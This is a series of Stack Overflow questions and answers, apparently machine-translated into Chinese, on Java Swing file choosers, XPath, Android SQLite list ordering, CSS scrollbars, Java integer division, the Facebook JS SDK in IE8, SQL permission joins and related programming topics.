`notepad.exe`我需要一个类似或`mspaint.exe`处于保存模式的 JFileChooser 。您可能知道，当您在*文件名字*段中键入通配符（* 或？）时，文件视图将仅显示与用户输入匹配的那些文件。这没关系，但我的问题是*文件类型*组合框：

In `JFileChooser`：当用户在*文件名字段中输入通配符时，**文件类型*组合框也会更新。[看这里](http://dl.dropbox.com/u/45132409/in%20jfilechooser.PNG)的截图！

 *但是，如果您尝试这样做，`notepad.exe`您会发现*文件名字*段保持原样，因此搜索模式没有更新。[在此处](http://dl.dropbox.com/u/45132409/in%20notepad.PNG)查看记事本的屏幕截图！

所以我的问题是：**有没有人知道如何实现*文件类型*组合框不应该被输入的过滤器更新？**

我需要一个跨平台的解决方案，所以它应该可以在 XP 和 Linux 上运行。

提前致谢！

对不起链接，但我不能直接附加它！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-02-27T08:18:43.873

最后我找到了一个解决方案：使用派生自的自定义文件选择器 UI`BasicFileChooserUI`将通过以下方式解决我的问题：我已经`getApproveSelectionAction()`用我的自定义操作覆盖了该方法：

```
protected class CustomApproveSelectionAction extends BasicFileChooserUI.ApproveSelectionAction {

    @Override
    public void actionPerformed(ActionEvent e) {
        String filename = getFileName();
        // using a custom pattern to accept valid charachters only:
        Matcher matcher = pattern.matcher(filename);

        if (matcher.matches()) { 
            // this is the good case, just let the super implementation do what have to do.
            super.actionPerformed(e);
        } else {
            // this is the bad case, we must warn the user and don't let the super implementation take effect.
            // display an error message similar like notepad does it.
        }
    }
} 
```

如果文件名没问题，那么我允许超级实现执行的操作，否则我将显示一条消息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-13T00:14:24.350

[全局](http://en.wikipedia.org/wiki/Glob_%28programming%29)模式识别功能在每个外观的委托`FileChooserUI`中实现。例如，[`MetalFileChooserUI`](http://docs.oracle.com/javase/6/docs/api/javax/swing/plaf/metal/MetalFileChooserUI.html)包含一个嵌套的`ApproveSelectionAction`、继承自`BasicFileChooserUI`的、调用`setFileFilter()`. 这通过 a 将新模式添加`PropertyChangeEvent`到侦听[`MetalFileChooserUI.FilterComboBoxModel`](http://docs.oracle.com/javase/7/docs/api/javax/swing/plaf/metal/MetalFileChooserUI.FilterComboBoxModel.html)中。您可能能够在链的某处拦截添加的过滤器。

您还可以利用Java 7 中引入并在[此处讨论的](https://stackoverflow.com/q/9148528/230513)[文件模式匹配](http://docs.oracle.com/javase/tutorial/essential/io/find.html)功能。*

# xpath - 使用 Xpath 选择从 xsd 中的基类扩展的所有节点

> ID：12392494
> 
> 赞同：1
> 
> 时间：2012-09-12T16:19:22.607
> 
> 标签：xpath, xsd

我的 xsd 文件如下：

```
<xs:complexType name="baseClass">
</xs:complexType>

<xs:complexType name="childClass1">
<xs:complexContent>
<xs:extension base="baseClass">
</xs:extension>
</xs:complexContent>
</xs:complexType>

<xs:complexType name="childClass2">
<xs:complexContent>
<xs:extension base="baseClass">
</xs:extension>
</xs:complexContent>
</xs:complexType> 
```

有没有办法使用 xpath 来选择 childClass1、childClass2 以及从 baseClass 扩展的所有类型，而无需单独选择所有 childClass？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-13T00:32:42.350

*在给定模式文档*中声明的直接扩展的所有复杂类型的集合`baseClass`可以通过

```
//xs:complexType[xs:complexContent/xs:extension[@base='baseClass']] 
```

但是，如果您不仅需要`childClass1`等等`childClass2`，还需要扩展它们的所有类型（并因此`baseClass`在一个*或多个*步骤中进行扩展），那么您将不得不将一些逻辑从 XPath 移动到某种宿主语言和循环中在元素之上。你想做什么可以用下面的伪代码来表达：

1.  从一个空队列和一个空累加器开始。
2.  推`baseClass`入队列。
3.  如果队列为空，则您想要的类型集在累加器中。停止。
4.  （如果到达这一步，则队列不为空。）从队列中移除第一项；让`$x`表示它的名字，如果它有一个，否则让 $x 是空字符串。
5.  找到集合`//xs:complexType[xs:complexContent/xs:extension[@base=$x]]`。将它们同时添加到队列和累加器中。
6.  转到第 3 步。

请注意，我编写的 XPath 表达式会发现所有扩展给定命名基的复杂类型；如果您只想命名复杂类型，`//`请将开头的`/xs:schema/`.

# c++ - 如何在 Windows 中为当前用户获取库文件夹列表？

> ID：12392495
> 
> 赞同：0
> 
> 时间：2012-09-12T16:19:23.717
> 
> 标签：c++, windows

在 Windows 环境中，有“Libraries”根目录，其中包含“Documents”、“Pictures”甚至“My Own Library”。

此外，“文档”将指几个位置 - “我的文档”、“公共文档”、“其他”

最后，很清楚如何找出“我的文档”或“公共文档”在磁盘上的位置。

我想知道如何在 C++ 中获取这些库名称的列表，然后如何获取所有库位置列表（我可以通过“属性-> 库位置”查看此列表）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T21:28:13.837

不确定我是否理解正确，但您可以通过使用参数调用[SHGetKnownFolderPath](http://msdn.microsoft.com/en-us/library/windows/desktop/bb762188%28v=vs.85%29.aspx)`FOLDERID_Libraries`并从那里枚举来获取库文件夹路径。

# google-app-engine - GAE 命名空间与线程安全一起使用是否安全？

> ID：12392500
> 
> 赞同：2
> 
> 时间：2012-09-12T16:19:46.180
> 
> 标签：google-app-engine

我有一个使用命名空间组织数据的 GAE 应用程序。我的问题是 - 命名空间是按线程管理还是按实例管理？如果我在 GAE 配置中启用线程安全，是否在一个线程中设置命名空间会影响其他线程？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-13T02:48:36.730

`set_namespace()`用途`os.environ`：

```
def set_namespace(namespace):
    ...
    os.environ[_ENV_CURRENT_NAMESPACE] = namespace 
```

并`os.environ`已被修补以使用线程本地存储。

所以是的，命名空间是线程安全的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T14:29:45.143

看起来命名空间在 GAE/J 上是线程安全的。

这已经通过运行执行以下操作的简单 servlet 进行了测试：

*   将命名空间设置为查询字符串参数
*   循环 25 秒，每 5 秒记录一次命名空间以及线程 ID
*   使用三个不同的命名空间调用 servlet 3 次，每次调用之间有 10 秒的暂停

在 appengine-web.xml 中设置 <threadsafe>true</threadsafe> 后，所有请求都由同一个实例处理。这通过检查应用引擎控制台中运行实例的数量和检查每个请求的日志来验证。每个日志条目都有一个类似的条目：instance=00c61b117c8e9fd8aa8b02bff53de32a49b20e。在同一实例中，在线程上设置命名空间不会影响其他线程上的命名空间。

为了确认配置中的线程安全设置是否有效，将其设置为 false 并运行相同的测试。正如预期的那样，每个请求都会启动一个新实例。

# android - Android：我必须在列表视图中显示数据库中的内容，其中最新数据排在最前面

> ID：12392501
> 
> 赞同：0
> 
> 时间：2012-09-12T16:19:46.147
> 
> 标签：android, sqlite, android-listview

我必须实现一个列表视图，其中我的当前数据位于列表视图之上。现在我最近的数据在底部，我的第一个数据在列表视图的顶部。到目前为止，我正在附上我的工作：

SearchActivity.java

```
public class SearchActivity extends Activity implements OnClickListener,
    OnItemClickListener {

private EditText mHistoryNameEditText;
private Button mInsertButton;
private ListView mHistoryListView;

private ListAdapter mHistoryListAdapter;

private ArrayList<SearchHistoryDetails> searchArrayList;

private ArrayList<SearchHistoryDetails> HistoryObjArrayList;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    mHistoryNameEditText = (EditText) findViewById(R.id.editText1);
    mInsertButton = (Button) findViewById(R.id.button1);
    mInsertButton.setOnClickListener(this);

    mHistoryListView = (ListView) findViewById(R.id.names_lsitviews);
    mHistoryListView.setOnItemClickListener(this);

    searchArrayList = new ArrayList<SearchHistoryDetails>();

    mHistoryListAdapter = new ArrayAdapter<String>(this,
            android.R.layout.simple_list_item_1, populateList());

    mHistoryListView.setAdapter(mHistoryListAdapter);

    HistoryObjArrayList = new ArrayList<SearchHistoryDetails>();
}

@Override
public void onClick(View v) {
    if (v.getId() == R.id.button1) {
        String providedUgraduateName = mHistoryNameEditText.getText()
                .toString();

        SearchHistoryDetails undergraduateDetailsPojoObj = new SearchHistoryDetails();
        undergraduateDetailsPojoObj.setuGraduateName(providedUgraduateName);

        HistoryObjArrayList.add(undergraduateDetailsPojoObj);

        insertUndergraduate(undergraduateDetailsPojoObj);

        finish();
    }
}

public void insertUndergraduate(
        SearchHistoryDetails paraUndergraduateDetailsPojoObj) {

    AndroidOpenDbHelper androidOpenDbHelperObj = new AndroidOpenDbHelper(
            this);

    SQLiteDatabase sqliteDatabase = androidOpenDbHelperObj
            .getWritableDatabase();

    ContentValues contentValues = new ContentValues();

    contentValues.put(AndroidOpenDbHelper.COLUMN_NAME_UNDERGRADUATE_NAME,
            paraUndergraduateDetailsPojoObj.getuGraduateName());
    long affectedColumnId = sqliteDatabase.insert(
            AndroidOpenDbHelper.TABLE_NAME_GPA, null, contentValues);

    sqliteDatabase.close();
    Toast.makeText(this,
            "Values inserted column ID is :" + affectedColumnId,
            Toast.LENGTH_SHORT).show();

}

public List<String> populateList() {

    List<String> uGraduateNamesList = new ArrayList<String>();

    AndroidOpenDbHelper openHelperClass = new AndroidOpenDbHelper(this);

    SQLiteDatabase sqliteDatabase = openHelperClass.getReadableDatabase();

    Cursor cursor = sqliteDatabase.query(
            AndroidOpenDbHelper.TABLE_NAME_GPA, null, null, null, null,
            null, null);

    startManagingCursor(cursor);

    while (cursor.moveToNext()) {

        String ugName = cursor
                .getString(cursor
                        .getColumnIndex(AndroidOpenDbHelper.COLUMN_NAME_UNDERGRADUATE_NAME));

        SearchHistoryDetails ugPojoClass = new SearchHistoryDetails();
        ugPojoClass.setuGraduateName(ugName);

        searchArrayList.add(ugPojoClass);

        uGraduateNamesList.add(ugName);
    }

    sqliteDatabase.close();

    return uGraduateNamesList;
}

@Override
protected void onResume() {
    super.onResume();
    searchArrayList = new ArrayList<SearchHistoryDetails>();
    mHistoryListAdapter = new ArrayAdapter<String>(this,
            android.R.layout.simple_list_item_1, populateList());
    mHistoryListView.setAdapter(mHistoryListAdapter);
}

@Override
protected void onStart() {
    super.onStart();
    searchArrayList = new ArrayList<SearchHistoryDetails>();
    mHistoryListAdapter = new ArrayAdapter<String>(this,
            android.R.layout.simple_list_item_1, populateList());
    mHistoryListView.setAdapter(mHistoryListAdapter);
}

@Override
public void onItemClick(AdapterView<?> arg0, View arg1, int arg2, long arg3) {

    Toast.makeText(getApplicationContext(), "Clicked on :" + arg2,
            Toast.LENGTH_SHORT).show();

    SearchHistoryDetails clickedObject = searchArrayList.get(arg2);

    Bundle dataBundle = new Bundle();
    dataBundle.putString("clickedUgraduateName",
            clickedObject.getuGraduateName());
}} 
```

此类帮助我从数据库中获取数据并将其填充到活动中。我创建数据库类：

AndroidOpenDbHelper.java

```
public class AndroidOpenDbHelper extends SQLiteOpenHelper {

public static final String DB_NAME = "allsearch_history_db";
public static final int DB_VERSION = 1;

public static final String TABLE_NAME_GPA = "search_table";
public static final String COLUMN_NAME_UNDERGRADUATE_NAME = "undergraduate_name_column";

public AndroidOpenDbHelper(Context context) {
    super(context, DB_NAME, null, DB_VERSION);
}

@Override
public void onCreate(SQLiteDatabase db) {

    String sqlQueryToCreateUndergraduateDetailsTable = "create table if not exists "
            + TABLE_NAME_GPA
            + " ( "
            + BaseColumns._ID
            + " integer primary key autoincrement, "
            + COLUMN_NAME_UNDERGRADUATE_NAME
            + " text not null); ";

    db.execSQL(sqlQueryToCreateUndergraduateDetailsTable);
}

@Override
public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
    if (oldVersion == 1 && newVersion == 2) {
        // Upgrade the database
    }
}} 
```

这是我创建数据库和表的类。

现在，真正的问题是，当我尝试从数据库中填充数据时，它会出现在顶部的第一个数据和向下的最新数据。我想恢复它。任何帮助将不胜感激克服这个问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T16:33:14.633

有几种不同的方法可以做到这一点。我建议使用`ORDER BY`查询的子句：

```
Cursor cursor = sqliteDatabase.query(
        AndroidOpenDbHelper.TABLE_NAME_GPA, null, null, null, null, null, 
        AndroidOpenDbHelper.COLUMN_NAME_UNDERGRADUATE_NAME + " DESC"); 
```

* * *

此外，如果您只想从一列中读取，您的查询应该只请求该列。否则，您正在浪费资源查询未使用的信息列：

```
Cursor cursor = sqliteDatabase.query(
        AndroidOpenDbHelper.TABLE_NAME_GPA,
        new String[] {AndroidOpenDbHelper.COLUMN_NAME_UNDERGRADUATE_NAME},
        null, null, null, null, 
        AndroidOpenDbHelper.COLUMN_NAME_UNDERGRADUATE_NAME + " DESC"); 
```

最后，您可能希望考虑使用[SimpleCursorAdapter](http://developer.android.com/reference/android/support/v4/widget/SimpleCursorAdapter.html)，它允许您使用最少的代码将查询绑定到 ListView。

* * *

**另外** ，我仔细查看了您的代码并尝试以下操作：

```
Cursor cursor = sqliteDatabase.query(
        AndroidOpenDbHelper.TABLE_NAME_GPA, null, null, null, null, null, 
        BaseColumns._ID + " DESC"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T16:27:53.863

好吧，我可以建议您从数据库中获取数据，并在您为填充列表视图而设置的适配器中以相反的顺序添加项目。将此视为示例，您可以[在](http://codinglookseasy.blogspot.in/2012/08/sqlite-database.html)其中从返回数组列表的数据库中获取值。现在考虑这个数组列表并将每个项目从最后一个添加到数组适配器中：

```
for(i=arraylist.size()-1;i>0;i--)
{ 
   adapter.add(arraylist.get(i));
} 
```

并且在第一次设置之后就可以调用

```
adapter.notifyDataSetChanged() 
```

自动刷新列表。试试这个

# css - 在 webkit 滚动条和屏幕边缘之间放置一些空间

> ID：12392503
> 
> 赞同：4
> 
> 时间：2012-09-12T16:19:57.350
> 
> 标签：css, webkit, scrollbar

我有这个制作 webkit 滚动条的 css 代码。

```
::-webkit-scrollbar {
  width: 8px;
  height: 8px;
} 
```

这将**在屏幕边缘旁边**创建一个滚动条。有什么办法可以在**屏幕边缘**和**滚动条**之间放置一些**空间**？

 ***** * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-12T16:27:53.910

[这](http://css-tricks.com/examples/WebKitScrollbars/)是我认为您在谈论的一个有趣的解决方案；他们实际上在 body 元素上放置了填充/位置：

```
body {
    position: absolute;
    top: 20px;
    left: 20px;
    bottom: 20px;
    right: 20px;
    padding: 30px; 
    overflow-y: scroll;
    overflow-x: hidden;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2019-02-28T21:44:36.330

不要这样做，你会扼杀可用性**。**

如果可滚动区域延伸到屏幕边缘，则滚动条也必须位于屏幕边缘。这样，用户可以简单地用光标点击屏幕边缘并使用滚动条。此动作不需要视觉注意或精确定位；这是一个简单、轻松的动作。

如果滚动条不在屏幕边缘，会发生以下情况：

1.  用户将想要滚动内容，这将无意识地转化为用光标点击屏幕边缘。
2.  这种无意识的滚动动作会失败，从而打破用户对内容的关注。
3.  用户将看向光标以查看问题所在。
4.  检测到问题后，用户必须精确移动鼠标才能将光标定位在滚动条上。如果使用非标准的、较窄的滚动条，这个动作的难度会更大。
5.  用户将单击并拖动，滚动内容并将焦点返回到它。

即使这一切都需要一秒钟，它仍然非常烦人并且完全没有必要，而且，我想，很可能会让用户将他们的业务转移到其他地方。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-08-30T20:54:20.883

**更改可滚动元素的宽度。例如...**

```
#div_content {
    width: calc(100% - 20px);
} 
```

**这样，页面的其他元素不受影响。例如。**

```
<div id="div_header">Welcome</div>

<div id="div_content">
    Scrollable content goes here.
</div>

<div id="div_footer">©2015 by Whomever</div> 
```

**示例 CSS...**

```
#div_header {
    position: absolute;
    left: 0;
    top: 0;
    width: 100%;
    height: 100px;
}

#div_content {
    position: absolute;
    left: 0;
    top: 100px;
    width: calc(100% - 20px);
    height: calc(100% - 140px);

    padding: 50px;

    overflow-x: hidden;
    overflow-y: auto;
}

#div_content::-webkit-scrollbar {
    -webkit-appearance: none;
}

#div_content::-webkit-scrollbar:vertical {
    width: 5px;
}

#div_content::-webkit-scrollbar:horizontal {
    height: 5px;
}

#div_content::-webkit-scrollbar-thumb {
    border-radius: 8px;
    border: none;
    background-color: #404040;
}

#div_footer {
    position: absolute;
    left: 0;
    bottom: 0;
    width: 100%;
    height: 40px;
} 
```****

# hibernate - BigInteger 的 GORM 映射

> ID：12392504
> 
> 赞同：1
> 
> 时间：2012-09-12T16:20:01.127
> 
> 标签：hibernate, grails, grails-orm

我正在使用 Grails 2.1.0，我的一个域类需要存储一个时间戳（它是一个 64 位无符号整数）。我知道在 C++ 中 unsigned long long 适合这个，但我不确定在 Groovy/Grails 中使用什么。我使用 BigInteger 在我的域类中表示该字段。

但是，我有一个 Java 遗留应用程序需要写入 Grails 应用程序生成的数据库。当我在数据库上运行 NetBeans HBM 文件和 POJO 生成时，此时间戳字段的 setter/getter 操作是 BigDecimal 而不是 BigInteger。为什么会这样？

我尝试转换为 BigDecimal，但传入的值在写入数据库时​​不适合 DECIMAL(19,2)。我在 Grails 论坛上进行了一些搜索，有人说这是 Hibernate 的问题。那是几年前的事了，所以我希望有一个比编写自定义类型更好的解决方案（这是帖子中推荐的）。我在 Hibernate 论坛上也找不到任何关于这个问题的信息。

# java - 计算两个数字的平均值返回 0.0(Java)

> ID：12392507
> 
> 赞同：0
> 
> 时间：2012-09-12T16:20:05.150
> 
> 标签：java, numbers

在创建了一个简单的 Java 掷骰子游戏后，我决定让它测试 100 万次迭代。无论出于何种原因，用此代码划分两个数字

```
System.out.println("Wins: "+w+" Losses: "+l);
double avg = 100*(w / l);
System.out.println("Average: "+avg); 
```

无论出于何种原因，这都会打印正确的输赢数量，但是当它除以它时，它只会得到 0.0 任何帮助将不胜感激。

解决的代码：

```
 double w = 0 , l = 0;
    for(int c=1;c<1000000;c++)
    {
    if(playGame() == true)
    {
        System.out.println("You win!");
        w++;
    }
    else
    {
        System.out.println("You lost!");
        l++;
    }
    }
    System.out.println("Wins: "+w+" Losses: "+l);
    double avg = (100*(w / l))/2;
    System.out.println("Average: "+avg); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T16:21:36.813

我怀疑你的`w`和`l`可能是整数。当您划分整数时，它们不会计算为双精度数，它们会计算为整数，并且它们总是向下舍入

如果确实如此，现在您有 2 个选项

*   在输入过程中取`w`和`l`作为双打
*   在对它们进行任何算术运算之前， cast`w`和to 加倍。`l`

尝试：

```
double dWin = w;
double dLoss = l

System.out.println("Wins: "+dWin+" Losses: "+dLoss);
double avg = 100*(dWin / l);
System.out.println("Average: "+avg); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T16:21:42.957

假设 w 和 l 是你做整数数学的整数。除非分子大于分母，否则整数除法将返回零。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-12T16:21:59.190

如果您的输入是整数，那么您的输出将是整数。您的一个或两个输入必须是浮点数或双精度数。

如果它们是整数并且您不能将它们更改为浮点数，您可以这样做

```
double avg = 100*(w / (l * 1d)); 
```

这将使 la 加倍，因此结果是加倍的。

如果没有 *100d，您将 int 值放入 double 中。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-12T16:23:45.680

**运算的结果是最大的操作数类型**......所以如果你`/`对两个应用运算，`int`答案将是`int`。

如果您想要精确的平均值，您应该将其中一个操作数类型转换为双精度。

尝试写作

```
double avg = 100*(((double)w) / l); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-12T16:39:54.423

其他人都忘记了乘法和除法的关联规则

```
double avg = 100.0 * w / l; 
```

会给你正确的答案，避免丑陋的演员:-)

# internet-explorer - Facebook JS 客户端身份验证在 IE 中不起作用

> ID：12392510
> 
> 赞同：1
> 
> 时间：2012-09-12T16:20:12.047
> 
> 标签：internet-explorer, facebook-javascript-sdk

我试图让 Facebook Javascript SDK 客户端身份验证正常工作，它在 Firefox 中这样做，但在 IE 中失败得很惨。在 IE 8 中，当我单击登录按钮时，什么也没有发生。没有覆盖，没有来自 IE 的警报，什么都没有。该代码是 Facebook 提供的示例代码，几乎没有修改。

```
<!DOCTYPE html>
<html>
  <html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://ogp.me/ns/fb#">
    <title>Facebook Client-side Authentication Example</title>
  </head>
  <body>
    <div id="fb-root"></div>
    <script>
      // Load the SDK Asynchronously
      (function(d){
         var js, id = 'facebook-jssdk', ref = d.getElementsByTagName('script')[0];
         if (d.getElementById(id)) {return;}
         js = d.createElement('script'); js.id = id; js.async = true;
         js.src = "//connect.facebook.net/en_US/all.js";
         ref.parentNode.insertBefore(js, ref);
       }(document));

      // Init the SDK upon load
      window.fbAsyncInit = function() {
        FB.init({
          appId      : 'xxxxxxxxxxxxxxx', // App ID
          channelUrl : '//thejspot.ws/channel.html', // Path to your Channel File
          status     : true, // check login status
          cookie     : true, // enable cookies to allow the server to access the session
          xfbml      : true  // parse XFBML
        });

        // listen for and handle auth.statusChange events
        FB.Event.subscribe('auth.statusChange', function(response) {
          if (response.authResponse) {
            // user has auth'd your app and is logged into Facebook
            FB.api('/me', function(me){
              if (me.name) {
                document.getElementById('auth-displayname').innerHTML = me.name;
                oFormObject = document.forms['ri_form'];
                oFormObject.elements['full_name'].value = me.name;
                oFormObject.elements['email_address_'].value = me.email;
                oFormObject.elements['gender'].value = me.gender;
                oFormObject.elements['locale'].value = me.locale;
              }
            })
            document.getElementById('auth-loggedout').style.display = 'none';
            document.getElementById('auth-loggedin').style.display = 'block';
          } else {
            // user has not auth'd your app, or is not logged into Facebook
            document.getElementById('auth-loggedout').style.display = 'block';
            document.getElementById('auth-loggedin').style.display = 'none';
          }
        });

        // respond to clicks on the login and logout links
        document.getElementById('auth-loginlink').addEventListener('click', function(){
          FB.login(function(response) {}, {scope: 'email'});
        });
        document.getElementById('auth-logoutlink').addEventListener('click', function(){
          FB.logout();
        }); 
      }
    </script>
    <h1>Facebook Client-side Authentication Example</h1>
      <div id="auth-status">
        <div id="auth-loggedout">
          <a href="#" id="auth-loginlink">Login</a>
        </div>
        <div id="auth-loggedin" style="display:none">
          <span id="auth-displayname"></span> (<a href="#" id="auth-logoutlink">logout</a>)<br /><br />
          <h3>Facebook Attributes</h3>
      </div>
    </div>
    <form action="" method="get" id="ri_form">
              Full Name: <input name="full_name" type="text"><br />
              Email: <input name="email_address_" type="text"><br />
              Gender: <input name="gender" type="text"><br />
              Locale: <input name="locale" type="text"><br />
          </form>
  </body>
</html> 
```

谁能告诉我我可能做错了什么？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:44:51.267

首先：是什么让您认为在您的页面中包含**两个** `<html>`元素会有益......？删除第一个，这是胡说八道。

> 在 IE 8 中，当我单击登录按钮时，什么也没有发生。

IE < 9 不支持`addEventListener`将事件处理程序绑定到 DOM 元素。因此，除非您还嵌入了一些将这种功能添加到旧 IE 的库（我没有看到任何内容），否则您的代码不能以这种方式工作......并且实际上应该在 JS 控制台中引发错误。（你有没有费心去看那里？）

# sql - 在 Sql server 中加入查询

> ID：12392511
> 
> 赞同：0
> 
> 时间：2012-09-12T16:20:14.480
> 
> 标签：sql, join

我在加入 sql 时遇到问题。我有 3 张桌子。

```
1: Lists the user details
2: Lists the permissions the user group has
3: Lists the page that that group can access 
```

```
 Table1 users :
   ****************************************
   username |  group
   ****************************************
   admin    |  administrator 

   Table2 groups :
   *********************************************
   user_group    | create | view | system_admin
   *********************************************
   administrator |   1    |   0  |      1

   Table3 urls:
   *********************************************
   create     |  view      | system_admin
   *********************************************
   create.php |  view.php  |  system.php 
```

（为我的表格图道歉）

我正在通过 php 做的是获取他们所属的 user_group。然后我需要检查他们是否可以访问他们刚刚点击的页面或将他们重定向回来。

我可以通过连接的方式使用当前的表格布局来实现这一点吗？或者我应该重新设计这些表格，因为它们对于这种事情并不直观。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T16:42:26.670

实际上，我可能会重新设计表格以使它们更易于查询：

```
create table users
(
    id int,
    username varchar(10),
    groupid int
);
insert into users values (1, 'admin', 1);

create table groups
(
    groupid int,
    groupname varchar(20)
);
insert into groups values (1, 'administrator');

create table permissions
(
    permissionid int,
    permissionname varchar(20)
);
insert into permissions values (1, 'create');
insert into permissions values (2, 'view');
insert into permissions values (3, 'system_admin');

create table urls
(
    urlid int,
    name varchar(10)
);
insert into urls values(1, 'create.php');
insert into urls values(2, 'view.php');
insert into urls values(3, 'system.php');

create table group_permission_urls
(
    groupid int,
    permissionid int,
    urlid int
);
insert into group_permission_urls values(1, 1, 1);
insert into group_permission_urls values(1, 0, 2);
insert into group_permission_urls values(1, 3, 3); 
```

那么您的查询将与此类似：

```
select *
from users us
left join groups g
  on us.groupid = g.groupid
left join group_permission_urls gpu
  on us.groupid = gpu.groupid
left join permissions p
  on gpu.permissionid = p.permissionid
left join urls u
  on gpu.urlid = u.urlid 
```

# 见[SQL Fiddle with Demo](http://sqlfiddle.com/#!3/3ae8f/1)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T16:37:50.257

通过将`$current_page`与子查询的结果进行比较`IN()`，您可以在一个查询中执行此操作。如果页面与用户有权访问的列中列出的任何内容匹配，则将返回一行。如果允许的列中没有匹配项，则不应返回任何行。

```
SELECT
  groups.create,
  groups.view, 
  groups.system_admin,
  1 AS can_access
FROM 
  users
  JOIN groups ON users.group = groups.user_group 
WHERE 
  users.username = '$some_username'
  AND (
    /* Substitute the current page. Better, use a prepared statement placeholder if your API supports it */
    (groups.create = 1 AND '$current_page' IN (SELECT DISTINCT create FROM urls))
    OR 
    (groups.view = 1 AND '$current_page' IN (SELECT DISTINCT view FROM urls))
    OR 
    (groups.system_admin = 1 AND '$current_page' IN (SELECT DISTINCT system_admin FROM urls))
  ) 
```

这通过将 与`$current_page`您的 3 列中的每一列中的不同的可能值集进行比较来工作。如果它匹配列*并且*用户的组对该类型具有权限，则返回一行。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-12T16:39:33.993

```
select case when count(1) > 0 then 'come in' else 'go away' end 
from users, groups, urls
where 
users.username = '$username' and
users.user_group = groups.user_group and
  ((urls.create = '$url' and groups.create = 1) or 
   (urls.view = '$url' and groups.view = 1) or 
   (urls.system_admin = '$url' and groups.system_admin = 1)) 
```

# java - 在 Eclipse 中显示 Java 应用程序的执行脚本

> ID：12392512
> 
> 赞同：3
> 
> 时间：2012-09-12T16:20:20.700
> 
> 标签：java, eclipse, execution

有没有办法在 Eclipse 中显示用于执行 java 应用程序的完整命令行？我正在使用朱诺。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:35:55.647

我不确定你在问什么，但如果你正在寻找当前执行的完整命令行，我不知道你可以在 Eclipse 中看到的地方。不过，如果您使用的是 Windows，我建议您使用 SysInternals（现在是 Microsoft）[Process Explorer](http://technet.microsoft.com/en-us/sysinternals/bb896653.aspx)。下面是我从 Eclipse 以调试模式启动的进程属性示例。

![Process Explorer 进程属性](../Images/6594b21d1039c0347dcaf4932de763ff.png)

# java - 在java中使用线程计算总时间

> ID：12392516
> 
> 赞同：1
> 
> 时间：2012-09-12T16:20:44.463
> 
> 标签：java, multithreading, swing

我有这个java代码使用线程来计算一旦点击开始按钮直到没有点击停止按钮所经过的时间。

**我只想使用线程来做到这一点**

```
import javax.swing.*;
import java.awt.event.*;

// This will count the elapsed time between running time of two threads.
class ThreadGame {

    JButton button;
    MyAction my_action;

    public static void main(String[] args) {
        ThreadGame tg = new ThreadGame();
    }

    public ThreadGame() {
        JFrame frame = new JFrame("Calculate time - Game");
        button = new JButton("Start");
        button.addActionListener(new MyAction());
        frame.add(button);
        frame.setSize(400, 400);
        frame.setVisible(true);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    }

    class MyAction implements ActionListener {

        public void actionPerformed(ActionEvent e) {
            String text = (String) e.getActionCommand();

            final Timer timer = new Timer();

            if (text.equals("Start")) {
                button.setText("Stop");

                Thread start_time = new Thread() {
                    public void run() {
                        timer.startTime();
                    }
                };

                start_time.start();
                try {
                    start_time.join();
                } catch (Exception e1) {
                }

            } else {
                Thread stop_time = new Thread() {
                    public void run() {
                        timer.stopTime();
                    }
                };

                Thread get_time = new Thread() {
                    public void run() {
                        timer.getElapsedTime();
                        System.out.println(timer.elapsed);
                    }
                };
                stop_time.start();
                try {
                    stop_time.join();
                } catch (Exception e2) {
                }

                get_time.start();

                button.setText("Start");
            }
        }
    }

    class Timer {
        public double startTime = 0.0;
        public double stopTime = 0.0;
        public boolean running = false;
        public double elapsed = 0.0;

        public void startTime() {
            this.startTime = System.nanoTime();
            this.running = true;
        }

        public void stopTime() {
            this.stopTime = System.nanoTime();
            this.running = false;
        }

        // Elasped time in seconds
        public double getElapsedTime() {
            // double elapsed;
            if (running) {
                elapsed = ((System.nanoTime() - startTime) / 1000);
            } else {
                elapsed = ((stopTime - startTime) / 1000);
            }
            return elapsed;
        }
    }
} 
```

`EDIT:`我已经理解了这个问题：`timer`范围是问题所在。

`EDIT 2:`好的，看来我只能在一个线程中使用`suspend`and 。`resume`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:24:33.133

**您的问题是由`timer`.** 这应该是私有实例变量，而不是局部方法变量。此外，对线程方法的调用`startTime`和`endTime`在线程`run`方法中的调用并没有为您带来任何好处，因为这些调用是非常短暂的调用。但这不是这里*真正的*问题。

没有理由`Timer`在自己的线程中运行。也就是说，在不使用专门的实时操作系统的情况下，**使用线程来解决测量两个事件之间持续时间的问题是*完全错误的。***

